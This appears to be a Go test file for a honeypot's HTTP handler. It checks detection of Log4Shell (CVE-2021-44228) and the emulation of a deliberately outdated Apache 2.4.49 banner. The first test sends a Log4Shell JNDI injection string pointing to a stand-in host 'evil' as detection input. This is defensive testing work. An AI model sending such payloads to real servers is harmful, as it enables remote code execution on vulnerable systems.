package handler

import (
	"strings"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/archetype"
	"github.com/rom/tarpit-honeypot/internal/config"
)

func TestHTTPDetectsLog4Shell(t *testing.T) {
	client, server := loopbackPair(t)
	go func() {
		_, _ = client.Write([]byte("GET /a?x=${jndi:ldap://evil/a} HTTP/1.0\r\nHost: x\r\n\r\n"))
	}()
	res, err := serveHTTP(server, config.Listener{ReadTimeout: 2 * time.Second}, nil, nil, nil, false)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, id := range res.CVEHits {
		if id == "CVE-2021-44228" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CVE-2021-44228 in CVEHits; got %v", res.CVEHits)
	}
}

func TestHTTPVulnBannerEmulation(t *testing.T) {
	arch := archetype.Lookup("debian 12")
	if arch == nil {
		t.Fatal("debian 12 archetype missing")
	}
	client, server := loopbackPair(t)
	go func() {
		_, _ = client.Write([]byte("GET / HTTP/1.0\r\nHost: x\r\n\r\n"))
	}()
	// vuln=true -> the deliberately-old Apache 2.4.49 banner + patch level.
	res, err := serveHTTP(server, config.Listener{ReadTimeout: 2 * time.Second}, nil, nil, arch, true)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res.BannerSent, "Apache/2.4.49") {
		t.Errorf("vuln banner not used; Server header = %q", firstHeaderLine(res.BannerSent, "Server:"))
	}
	if res.Meta["patch_level"] == nil {
		t.Errorf("expected patch_level meta; got %v", res.Meta)
	}
}

func TestHTTPNormalBannerWhenVulnOff(t *testing.T) {
	arch := archetype.Lookup("debian 12")
	client, server := loopbackPair(t)
	go func() {
		_, _ = client.Write([]byte("GET / HTTP/1.0\r\nHost: x\r\n\r\n"))
	}()
	res, err := serveHTTP(server, config.Listener{ReadTimeout: 2 * time.Second}, nil, nil, arch, false)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(res.BannerSent, "2.4.49") {
		t.Errorf("vuln banner leaked with vuln=false: %q", res.BannerSent)
	}
	if !strings.Contains(res.BannerSent, "Apache/2.4.62") {
		t.Errorf("expected patched Apache 2.4.62; got %q", firstHeaderLine(res.BannerSent, "Server:"))
	}
}

func firstHeaderLine(resp, prefix string) string {
	for _, l := range strings.Split(resp, "\r\n") {
		if strings.HasPrefix(l, prefix) {
			return l
		}
	}
	return ""
}
